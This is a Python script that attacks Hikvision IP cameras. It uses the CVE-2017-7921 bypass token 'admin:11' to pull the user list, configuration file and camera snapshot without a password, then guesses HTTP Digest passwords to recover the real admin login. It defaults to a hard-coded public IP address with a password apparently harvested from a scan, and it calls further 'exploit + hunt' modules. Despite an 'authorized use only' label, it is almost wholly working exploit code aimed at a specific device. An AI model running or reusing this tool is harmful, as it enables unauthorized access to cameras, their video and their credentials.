#!/usr/bin/env python3
"""
Test Hikvision credential discovery on a single target.

Usage (authorized targets only):
  python test_hikvision_target.py
  python test_hikvision_target.py -H 188.225.141.254
  python test_hikvision_target.py -H 188.225.141.254 -p 12345678eh

Compares:
  - CVE-2017-7921 backdoor (admin:11 bypass — NOT real password)
  - HTTP Digest login (real password, e.g. admin:12345678eh from Router Scan)
"""

from __future__ import annotations

import argparse
import base64
import sys

try:
    import bootstrap  # noqa: F401 — when run as tests/test_hikvision_target.py
except ModuleNotFoundError:
    from tests import bootstrap  # noqa: F401 — when imported from GUI package
import requests
import urllib3
from requests.auth import HTTPDigestAuth

urllib3.disable_warnings()

DEFAULT_HOST = "188.225.141.254"
BACKDOOR_B64 = "YWRtaW46MTEK"  # admin:11
ROUTER_SCAN_PASSWORD = "12345678eh"

CHECK_PATHS = (
    "/ISAPI/Security/userCheck",
    "/ISAPI/System/deviceInfo",
    "/PSIA/Custom/SelfExt/userCheck",
    "/doc/page/login.asp",
)


def _session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 Hikvision-Test/1.0"
    s.timeout = 12
    return s


def decode_backdoor() -> str:
    raw = base64.b64decode(BACKDOOR_B64).decode("utf-8", errors="ignore").strip()
    return raw.replace("\n", "")


def test_backdoor(host: str) -> dict:
    """Backdoor bypass — snapshot/config without real password."""
    base = f"http://{host}"
    auth_q = f"?auth={BACKDOOR_B64}"
    session = _session()
    results = {}

    endpoints = {
        "users": f"{base}/Security/users{auth_q}",
        "config": f"{base}/System/configurationFile{auth_q}",
        "snapshot": f"{base}/onvif-http/snapshot{auth_q}",
        "login_page": f"{base}/doc/page/login.asp",
    }

    for name, url in endpoints.items():
        try:
            r = session.get(url, timeout=12)
            results[name] = {
                "url": url,
                "status": r.status_code,
                "size": len(r.content),
                "ok": r.status_code == 200 and len(r.content) > 100,
            }
        except requests.RequestException as exc:
            results[name] = {"url": url, "status": "error", "error": str(exc), "ok": False}

    return results


def test_digest_login(host: str, username: str, password: str) -> dict:
    """Real login via HTTP Digest (what Router Scan validates)."""
    base = f"http://{host}"
    session = _session()
    digest = HTTPDigestAuth(username, password)
    hits = []

    for path in CHECK_PATHS:
        url = f"{base}{path}"
        try:
            r = session.get(url, auth=digest, timeout=12)
            body = r.text[:500].lower()
            ok = r.status_code == 200 and (
                "statusvalue>200" in body
                or "deviceinfo" in body
                or "devicetype" in body
                or (path.endswith("login.asp") and "login" in body and r.status_code == 200)
            )
            hits.append({
                "path": path,
                "status": r.status_code,
                "ok": ok,
                "snippet": r.text[:120].replace("\n", " "),
            })
        except requests.RequestException as exc:
            hits.append({"path": path, "status": "error", "error": str(exc), "ok": False})

    any_ok = any(h.get("ok") for h in hits)
    return {"username": username, "password": password, "valid": any_ok, "checks": hits}


def test_basic_login(host: str, username: str, password: str) -> dict:
    """Basic auth (usually fails on Hikvision — included to show the difference)."""
    base = f"http://{host}"
    session = _session()
    try:
        r = session.get(f"{base}/ISAPI/Security/userCheck", auth=(username, password), timeout=12)
        return {"valid": r.status_code == 200, "status": r.status_code, "method": "HTTP Basic"}
    except requests.RequestException as exc:
        return {"valid": False, "error": str(exc), "method": "HTTP Basic"}


def run_full_hunt(host: str) -> None:
    from engines.credential_hunter import hunt_hikvision_credentials
    from engines.device_cve_checker import assess_hikvision, print_cve_report
    from engines.hikvision_module import HikvisionExploiter

    print("\n[4] Running integrated exploit + credential hunt (main.py logic)...")
    url = f"http://{host}"
    hexp = HikvisionExploiter(url)
    users, passwords = hexp.run_backdoor()
    entry = hunt_hikvision_credentials(host, users, passwords, port=80)
    if entry:
        print(f"    [+] HUNT RESULT: {entry.username}:{entry.password} ({entry.auth_method})")
    else:
        print("    [!] Hunt did not confirm a real Digest password.")


def main() -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    p = argparse.ArgumentParser(description="Hikvision credential test (authorized use only)")
    p.add_argument("-H", "--host", default=DEFAULT_HOST)
    p.add_argument("-p", "--password", default="", help="Single password to test (e.g. 12345678eh)")
    p.add_argument("--full", action="store_true", help="Run full exploit + hunt from main.py modules")
    args = p.parse_args()
    host = args.host.strip()

    print("=" * 70)
    print(f"  HIKVISION CREDENTIAL TEST — {host}")
    print(f"  Login page: http://{host}/doc/page/login.asp")
    print("=" * 70)

    print("\n[1] CVE-2017-7921 BACKDOOR (bypass — NOT the real web password)")
    print(f"    Decoded bypass token: {decode_backdoor()}")
    backdoor = test_backdoor(host)
    for name, info in backdoor.items():
        status = info.get("status", "?")
        ok = info.get("ok", False)
        mark = "[+]" if ok else "[-]"
        extra = f" ({info['size']} bytes)" if "size" in info else ""
        print(f"    {mark} {name:12} HTTP {status}{extra}")

    print("\n[2] HTTP BASIC auth (admin + test passwords) — expect FAIL on Hikvision")
    for pw in ("11", ROUTER_SCAN_PASSWORD):
        basic = test_basic_login(host, "admin", pw)
        mark = "[+]" if basic.get("valid") else "[-]"
        print(f"    {mark} admin:{pw} -> {basic}")

    print("\n[3] HTTP DIGEST auth (real login — Router Scan method)")
    candidates = [ROUTER_SCAN_PASSWORD, "12345", "123456", "12345678", "admin"]
    if args.password:
        candidates.insert(0, args.password)
    seen = set()
    found_real = None
    for pw in candidates:
        if pw in seen:
            continue
        seen.add(pw)
        result = test_digest_login(host, "admin", pw)
        mark = "[+]" if result["valid"] else "[-]"
        print(f"    {mark} admin:{pw} -> valid={result['valid']}")
        for check in result["checks"]:
            if check.get("ok"):
                print(f"         OK on {check['path']} (HTTP {check['status']})")
        if result["valid"] and pw != "11":
            found_real = pw
            break

    print("\n[4] CVE INTELLIGENCE (firmware → CVE map)")
    auth_tuple = ("admin", found_real) if found_real else None
    intel = assess_hikvision(host, auth=auth_tuple)
    print_cve_report(intel)

    print("\n" + "=" * 70)
    print("  CONCLUSION")
    print("=" * 70)
    if backdoor.get("snapshot", {}).get("ok"):
        print("  Backdoor snapshot: WORKS without real password (admin:11 bypass)")
    if found_real:
        print(f"  REAL PASSWORD    : admin:{found_real}")
        print("  Use this for login.asp / ISAPI / RTSP — NOT admin:11")
    else:
        print("  Real password not confirmed in this run.")
        print(f"  Try manually: admin:{ROUTER_SCAN_PASSWORD} on login page")
        print(f"  http://{host}/doc/page/login.asp")
    print("=" * 70)

    if args.full:
        run_full_hunt(host)

    return 0 if found_real or backdoor.get("snapshot", {}).get("ok") else 1


if __name__ == "__main__":
    raise SystemExit(main())
